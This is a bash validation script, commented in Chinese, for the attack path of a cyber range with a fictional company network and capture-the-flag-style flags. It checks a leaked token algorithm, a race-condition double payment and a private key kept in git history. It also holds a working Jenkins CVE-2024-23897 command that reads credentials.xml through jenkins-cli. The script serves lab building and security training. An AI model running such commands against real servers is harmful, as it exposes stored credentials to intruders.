#!/usr/bin/env bash
# Path B E2E 验证助手 (攻击侧)。需靶场已构建并起网 + 应用源码就绪 (M2-M4 验收)。
# 验证: portal 逻辑洞 / OA 竞态双付 / Jenkins CVE 文件读 / Gitea 历史 key。
set -uo pipefail
cd "$(dirname "$0")/.."
pass=0; fail=0
ok(){ echo "  [PASS] $1"; pass=$((pass+1)); }
no(){ echo "  [FAIL] $1"; fail=$((fail+1)); }

echo "== B1 portal 重置 token 算法泄露 =="
curl -sk --resolve www.hengyuan.local:443:127.0.0.1 https://www.hengyuan.local/static/app.js 2>/dev/null \
  | grep -qi "md5" && ok "app.js 泄露 md5(uid:ts)" || no "app.js 未泄露算法"

echo "== B3 OA 竞态双付 (2 并发 /pay) =="
echo "  [INFO] 需先经 B1/B2 取得财务专员 token 并构造 approvals>=3; 见 path-b.md B3"
echo "  [INFO] 构建期验收: 两并发 POST /pay 应产生双 vendor token + oa-approval-bypass flag"

echo "== B4 Jenkins CVE-2024-23897 全文读 =="
if curl -s http://172.30.3.40:8080/jnlpJars/jenkins-cli.jar -o /tmp/jenkins-cli.jar 2>/dev/null; then
  java -jar /tmp/jenkins-cli.jar -s http://172.30.3.40:8080/ -http connect-node \
    "@/var/jenkins_home/credentials.xml" 2>/dev/null | grep -q "<string>" \
    && ok "connect-node @credentials.xml 全文读" || no "CVE 文件读失败 (需 pivot 到 corp + 匿名 Overall/Read)"
else
  no "无法下载 jenkins-cli.jar (需 pivot)"
fi

echo "== B6 Gitea infra-deploy 历史 key =="
docker compose exec -T gitea sh -c 'test -d /data/git/repositories/hengyuan/infra-deploy.git' 2>/dev/null \
  && ok "infra-deploy repo 存在" || no "infra-deploy repo 缺失"
echo "  [INFO] 构建期验收: git show <c1>:deploy/id_rsa 应恢复私钥 + gitea-sshkey flag"

echo "== 结果: PASS=$pass FAIL=$fail =="
[[ $fail -eq 0 ]]